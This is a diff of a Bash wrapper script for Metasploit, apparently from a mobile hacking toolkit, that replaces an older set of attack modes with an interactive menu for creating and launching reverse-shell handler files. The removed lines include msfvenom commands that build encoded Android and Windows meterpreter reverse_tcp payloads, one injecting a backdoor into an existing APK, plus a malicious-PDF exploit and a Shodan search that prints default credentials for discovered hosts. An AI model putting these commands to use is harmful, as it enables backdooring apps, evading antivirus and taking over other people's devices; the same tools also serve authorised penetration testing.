@@ -4,119 +4,72 @@ IFS=$'\n\t'
 trap ctrl_c 2
 source $HOME/.local/etc/i-Haklab/variables
 source $iHETC/functions
+
 chk-pkg msfconsole metasploit-framework
 
-# opts=$1
-# HOST=${2:-$LOCALHOST}
-# if chk-root;then
-# 	PORT=${3:-$RPORT}
-# 	user=sudo
-# else
-# 	PORT=${3:-$LPORT}
-# 	user=exec
-# fi
-# apk=$4
+getPORT
+declare PAYLOAD=""
+declare LHOST=$LOCALHOST
+declare rcDir="$iHETC/rcFiles"
+mkdir -p $rcDir
 
-[[ -d $iHETC/rcFiles ]] || mkdir -p $iHETC/rcFiles
-rcFiles="$iHETC/rcFiles"
 
-handlerRC(){
-cat <<- CONF > $rcFiles/$opts.rc
-use exploit/multi/handler
-set PAYLOAD $PAYLOAD
-set LHOST $HOST
-set LPORT $PORT
-run
-CONF
-	printf "$Y(_➤)$W HOST= $HOST\n$Y(_➤)$W PORT= $PORT\n$Y(_➤)$W Payload= $PAYLOAD\n$Y(_➤)$W Handler file= $opts.rc\n"
-	$user msfconsole -q -r $rcFiles/$opts.rc
+main(){ 
+rcFiles=$(find $rcDir -maxdepth 1 -type f -iname "*.rc"|awk -F "/" '{print $NF}' 2>/dev/null)
+select answ in $rcFiles Create Delete Exit; do
+    case $answ in
+        Create ) CreateHandler && main;;
+        Delete ) DelFile && main;;
+        Exit ) exit 0 ;;
+        * ) fileRC=$answ ;;
+    esac
+    break
+done 
 }
 
-[[ $# -eq 0 ]] && { STDERR; exit 1; }
+CreateHandler(){
+    echo -en "Handler file name (without .rc) "
+    while read -p ":─➤ " fileName && [ -z $fileName  ]; do
+        continue
+    done
+    if [[ -f "$rcDir/$fileName.rc" ]]; then
+        echo -en "$Y[!]$W Handler file $fileName.rc already exists.\n ╰──➤ Please choose a different name."
+        createHandler
+    fi
+
+    echo -en "Enter payload (e.g., android/meterpreter/reverse_tcp) "
+    while read -p ":─➤ " PAYLOAD && [ -z $PAYLOAD  ]; do
+        continue
+    done
+
+    cat <<- CONF > $rcDir/$fileName.rc
+use exploit/multi/handler
+set PAYLOAD $PAYLOAD
+set LHOST $LHOST 
+set LPORT $LPORT
+run
+CONF
+}
+
+DelFile(){
+    echo -en "Handler file to delete (without .rc) "
+    while read -p ":─➤ " fileName && [ -z $fileName  ]; do
+        continue
+    done
+    if [[ ! -f "$rcDir/$fileName.rc" ]]; then
+        echo -en "$Y[!]$W Handler file $fileName.rc does not exist."
+        DelFile
+    fi
+
+    rm -f $rcDir/$fileName.rc 
+    echo -e "$G[✔]$W Handler file $fileName.rc deleted successfully."
+}
 
 banner
+main
 
+printf "$Y(_➤)$W HOST= $LHOST\n$Y(_➤)$W PORT= $LPORT\n$Y(_➤)$W Payload= $PAYLOAD\n$Y(_➤)$W Handler file= $fileName.rc\n"
 
+chmod 750 $rcDir/*
 
-
-case $opts in
-	dirscan)
-		[[ -z $2 ]] && STDERR
-		cat <<- CONF > $rcFiles/$opts.rf
-		use auxiliary/scanner/http/dir_scanner
-		set RHOST $2
-		run
-		CONF
-		$user msfconsole -q -r $rcFiles/$opts.rc
-		;;
-	embed)
-		PAYLOAD=android/meterpreter/reverse_tcp
-		$user msfvenom -x $apk -p $PAYLOAD LHOST=$HOST LPORT=$PORT -a dalvik --platform android -o $apk-$opts >/dev/null || exit
-		handlerRC
-		;;
-	payapk)
-		PAYLOAD=android/meterpreter/reverse_tcp
-		msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT -e x86/shikata_ga_nai -i 5 -a dalvik --platform android -o $opts.apk >/dev/null || exit
-		handlerRC
-		;;
-	payexe)
-		PAYLOAD=windows/meterpreter/reverse_tcp
-		msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT -f exe -e x86/shikata_ga_nai -i 5 -o $opts.exe > /dev/null || exit
-		handlerRC
-		;;
-	paypdf)
-		cat <<- CONF > $rcFiles/$opts.rc
-		use exploit/android/fileformat/adobe_reader_pdf_js_interface
-		set LHOST $HOST
-		set LPORT $PORT
-		set FILENAME $opts.pdf
-		run
-		use exploit/multi/handler
-		set LHOST $LOCALHOST
-		set LPORT $LPORT
-		run
-		CONF
-		$user msfconsole -q -r $rcFiles/$opts.rc
-		;;
-	shodan)
-		if [[ ! -e $MSFPATH/documentation/api/apikey ]]
-			then
-				mkdir -p $MSFPATH/documentation/api
-				touch $MSFPATH/documentation/api/apikey
-		fi
-		APIKEYFILE=$MSFPATH/documentation/api/apikey
-		if [[ ! $(cat $APIKEYFILE) ]];then
-			printf "$Y(_➤)$W Type your shodan APIKEY"
-			while read -p ": " ANSW && [ -z $ANSW ]; do
-				printf "$R(_➤)$W Go to www.shodan.io to get your APIKEY\n"
-				exit
-			done
-			echo $ANSW > $APIKEYFILE
-		fi
-		APIKEY=$(cat $APIKEYFILE)
-		if [ -e $iHETC/shodan/query ]; then
-			printf "$Y(_➤)$W Choose a type of search :\n"
-			cat $iHETC/shodan/query | sort
-			echo
-			while read -p "(_➤) " QUERY && [ -z $QUERY ];do
-				continue
-			done
-		else
-			printf "$R(_➤) ERROR :$W Not such query file\n"
-		fi
-		cat <<- CONF > $rcFiles/$opts.rc
-		use auxiliary/gather/shodan_search
-		set SHODAN_APIKEY $APIKEY
-		set QUERY "$QUERY"
-		run
-		CONF
-		printf "$Y(_➤)$W If some target need user/passwd you can use those:\n"
-		cat $iHETC/shodan/usrpasswd.txt
-		printf "\n\tpress$G ENTER$W to continue\n"
-		read enter
-		msfconsole -q -r $rcFiles/$opts.rc
-		;;
-	*)
-		STDERR
-		;;
-esac
+msfconsole -q -r $rcDir/$fileName.rc
